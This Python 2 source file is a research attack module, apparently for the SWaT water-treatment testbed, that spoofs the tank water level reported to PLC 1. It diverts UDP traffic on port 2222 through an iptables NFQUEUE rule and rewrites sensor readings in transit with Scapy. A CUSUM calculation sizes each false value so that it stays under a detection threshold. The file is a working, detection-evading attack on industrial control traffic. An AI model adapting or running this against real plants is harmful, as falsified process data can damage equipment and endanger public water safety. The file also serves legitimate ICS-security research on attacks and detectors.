#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2015 David I. Urbina, UTD
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
"""Secure Water Testbed (SWaT) Singapore University of Technology and Design.
SWATAttack module to spoof water level in PLC 1.
"""
from __future__ import print_function

import math
import os
import sys
import threading
import time

from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP
from scapy.layers.inet import UDP

import filters
import scaling
import swat


class RepeatEvery(threading.Thread):
    def __init__(self, interval, func, *args, **kwargs):
        threading.Thread.__init__(self)
        self.interval = interval  # seconds between calls
        self.func = func  # function to call
        self.args = args  # optional positional argument(s) for call
        self.kwargs = kwargs  # optional keyword argument(s) for call
        self.runable = True

    def run(self):
        time.sleep(5)
        while self.runable:
            self.func(*self.args, **self.kwargs)
            time.sleep(self.interval)

    def stop(self):
        self.runable = False


# Constants
FLOW = 2.5  # Water flow in m^3/h
DIA = 1.38  # Tank 1 diameter
first = True

# Parameters list
A = 0.005
L = 0.1
T = 0.09
slope_sign = False

# Signals
alevel = 0
elevel = 0
pump = 0
valve = 0
cusum = 0
stop_sniffer = False


def calculate_attack():
    global valve, pump, cusum, elevel, alevel
    u = FLOW / (3600 * math.pi * math.pow(DIA / 2, 2))  # Water volume change
    u *= valve - pump  # Direction of water volume change
    elevel = elevel + u + L * (alevel - elevel)

    # Calculate cusum
    cusum += abs(alevel - elevel) - A
    cusum = max(cusum, 0)

    print('{},{},{},{}'.format(alevel, elevel, abs(alevel - elevel), cusum))
    # Calculate largest attack given the current cusum
    l = T - cusum + A
    l = l if slope_sign else -l
    alevel = l + elevel


thread = RepeatEvery(1, calculate_attack)


def __inject(packet):
    pkt = IP(packet.get_payload())
    if swat.SWAT_P1_RIO_DI in pkt:
        global valve, pump
        valve = pkt[swat.SWAT_P1_RIO_DI].valve_open
        pump = pkt[swat.SWAT_P1_RIO_DI].pump1_run

    if swat.SWAT_P1_RIO_AI in pkt:
        global elevel, alevel, first
        if first:
            elevel = alevel = filters.scale(pkt[swat.SWAT_P1_RIO_AI].level, scaling.P1Level) / 1000
            thread.start()
            first = False
            # calculate_attack()

        attack = filters.reverse_scale(alevel * 1000, scaling.P1Level)
        pkt[swat.SWAT_P1_RIO_AI].level = attack
        del pkt[UDP].chksum  # Need to recompute checksum
        packet.set_payload(str(pkt))

    packet.accept()


def start():
    __setup()
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, __inject)
    # thread = RepeatEvery(1, calculate_attack)
    try:
        print("[*] starting water level spoofing")
        # thread.start()
        nfqueue.run()
    except KeyboardInterrupt:
        __setdown()
        thread.stop()
        thread.join()
        nfqueue.unbind()
        print("[*] stopping water level spoofing")
    return 0


def configure():
    global L, A, slope_sign, T
    L = input('Set Estimation Gain (L): ')
    A = input('Set Alpha (A): ')
    T = input('Set Threshold (T): ')
    slope_sign = input('Set slope sign Increasing(1) Decreasing(0): ')
    params()


def params():
    slope = 'Increasing' if slope_sign else 'Decreasing'
    print('Slope: {} L: {} A: {} T: {}'.format(slope, L, A, T))


def __setup():
    global first
    first = True
    os.system('sudo iptables -t mangle -A PREROUTING -p udp --dport 2222 -j NFQUEUE')


def __setdown():
    os.system('sudo iptables -t mangle -D PREROUTING -p udp --dport 2222 -j NFQUEUE')


if __name__ == '__main__':
    sys.exit(start())
